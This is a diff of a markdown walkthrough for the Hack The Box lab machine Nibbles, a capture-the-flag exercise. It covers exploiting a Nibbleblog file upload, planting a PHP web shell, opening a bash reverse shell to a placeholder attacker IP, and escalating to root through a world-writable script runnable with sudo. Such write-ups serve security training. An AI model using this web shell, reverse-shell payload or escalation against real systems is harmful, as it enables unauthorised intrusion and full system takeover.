@@ -514,6 +514,10 @@ python3 bruteforce.py http://10.129.96.84/nibbleblog/admin.php admin custom_dict
 >     parser.add_argument('username', action='store', help='Username to log in')
 >     parser.add_argument('dictionary', action='store', help='Password dictionary')
 > 
+>     if len(sys.argv) == 1:
+>         parser.print_help()	
+>         sys.exit()
+>
 >     args = parser.parse_args()
 > 
 >     bruteforcer = BruteForcer(args.url, args.username, args.dictionary)
@@ -578,7 +582,7 @@ If accessed, the above resouce displays the following →
 
 Therefore, this *Software Version* has been exploited via an *Arbitrary File Upload*
 
-Thank to the uploaded *PHPINFO()*, It is possible to check the *disable_functions* parameter value
+Thank to the uploaded `phpinfo();`, It is possible to check the *disable_functions* parameter value
 
 The same can be achieved uploading the following payload which checks what *PHP Dangerous Functions* are not disabled
 
@@ -609,3 +613,181 @@ The same can be achieved uploading the following payload which checks what *PHP 
 > getEnabledFunctions();
 > ?>
 > ```
+
+In this case, *PHP Functions* such as *exec, shell_exec or system* are not disabled
+
+Thus, one of them is used to upload a web shell
+
+```php
+<?php echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
+```
+
+To get a *Reverse Shell* simply as a `cmd` URL parameter value the following bash payload →
+
+```bash title="Target"
+bash -c "bash -i &> /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"
+```
+
+While listening on the other side →
+
+```bash title="Attacker"
+nc -nlvp <ATTACKER_PORT>
+```
+
+The `&` may should be *URL Encoded* to `%26` to avoid errors
+
+#### Shell as Web User
+
+Once a connection via *Reverse Shell* is stablished, just proceed as follows to upgrade the obtained shell to a *Fully Interactive TTY*
+
+```bash title="Target"
+script /dev/null -c bash
+<C-z>
+```
+
+```bash title="Attacker"
+stty raw -echo ; fg
+reset xterm
+```
+
+```bash title="Target"
+export TERM=xterm-256color
+export SHELL=/bin/bash
+. /etc/skel/.bashrc
+stty rows <ROWS> columns <COLUMNS>
+```
+
+#### Privesc
+
+***Initial Non-Privileged User → Nibbler***
+
+Check the existent user directories in the `/home` Path
+
+```bash
+ls -l /home
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> total 4
+> drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 nibbler
+> ```
+>
+
+There is only one and It is owned by the user `Nibbler`
+
+Therefore, *Privilege Escalation* is done directly to the `Root` user
+
+##### *User Groups*
+
+```bash
+id
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+> ```
+>
+
+The user is not part of any interesting group
+
+##### *Sudo Privileges*
+
+```bash
+sudo -l
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Matching Defaults entries for nibbler on Nibbles:
+>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+>
+> User nibbler may run the following commands on Nibbles:
+>     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+> ```
+>
+
+The `Nibbler` user can run the command following command as `Root` without providing a password
+
+`/home/nibbler/personal/stuff/monitor.sh`
+
+Thus, check the `/home/nibbler` content
+
+```bash
+ls -l /home/nibbler
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> total 8
+> -r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+> -r-------- 1 nibbler nibbler   33 Oct 26 00:42 user.txt 
+> ```
+>
+
+In addition to the user flag, a *ZIP File* is there
+
+List its content as follows →
+
+```bash title="/home/nibbler"
+unzip -l -- personal.zip
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> Archive:  personal.zip
+>   Length      Date    Time    Name
+> ---------  ---------- -----   ----
+>         0  2017-12-10 21:58   personal/
+>         0  2017-12-10 22:05   personal/stuff/
+>      4015  2015-05-08 03:17   personal/stuff/monitor.sh
+> ---------                     -------
+>      4015                     3 files
+> ```
+>
+
+The only resulting file is the `monitor.sh` script, which `Nibbler` can run as `Root`
+
+Let's see the above file permissions and owners
+
+```bash title="/home/nibbler"
+command -V tree &> /dev/null && tree -fpugh ./personal
+# Or
+command -V find &> /dev/null && find ./personal -type f -ls 2> /dev/null
+```
+
+> [!NOTE]- *Command Output*
+>
+> ```bash
+> 615      4 -rwxrwxrwx   1 nibbler  nibbler      4015 May  8  2015 ./personal/stuff/monitor.sh
+> ```
+>
+
+The `Nibbler` user is the user owner and the File Permissions are `777`
+
+Therefore, just modify this script and the following line to gain a shell as `Root`
+
+```bash title="/home/nibbler/personal/stuff/monitor.sh"
+bash -pi
+```
+
+Once modified, run the `sudo` command as follows
+
+```bash
+sudo -u root /home/nibbler/personal/stuff/monitor.sh
+```
+
+That's it!
+
+```bash
+cat /root/root.txt
+```
+
+![[NIBBLES_PWNED.gif|350]]
+> ***Pwned!***
